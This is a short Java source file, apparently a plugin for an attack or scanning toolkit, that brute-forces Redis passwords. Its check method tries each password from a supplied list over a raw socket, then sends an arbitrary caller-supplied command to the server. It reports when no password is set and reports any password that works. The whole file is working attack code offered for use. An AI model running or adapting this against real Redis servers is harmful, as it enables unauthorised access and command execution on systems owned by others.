package com.tiji.plugin.plugin;

import com.tiji.plugin.util.PluginUtil;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.List;
import java.util.Map;

/**
 * Redis未授权访问/密码爆破插件
 *
 * @author 贰拾壹
 * @create 2018-09-14 15:38
 */

public class JavaRedisWeakPass {
    public static StringBuilder check(String ip, String port, String cmd, String timeout, Map<String, List<String>> payloadMap) throws IOException {
        List<String> passwordList = payloadMap.get("password");
        StringBuilder resultStringBuilder = new StringBuilder();
        for (String pass : passwordList) {
            resultStringBuilder.delete(0, resultStringBuilder.length());
            String command = "AUTH " + pass + "\r\n" + cmd + "\r\n";
            try (Socket socket = new Socket(ip, Integer.parseInt(port));
                 OutputStream out = socket.getOutputStream();
                 InputStream in = socket.getInputStream();) {
                String result = PluginUtil.exeCommand(timeout, command, socket, out, in);
                if (result.contains("no password is set")) {
                    resultStringBuilder.append("Redis未设置密码\n");
                    resultStringBuilder.append(result);
                    break;
                }
                if (result.contains("+OK")) {
                    resultStringBuilder.append("用户名密码: ").append(pass).append("\n");
                    resultStringBuilder.append(result);
                    break;
                }
            } catch (IOException ignored) {
            }
        }
        return resultStringBuilder;
    }

}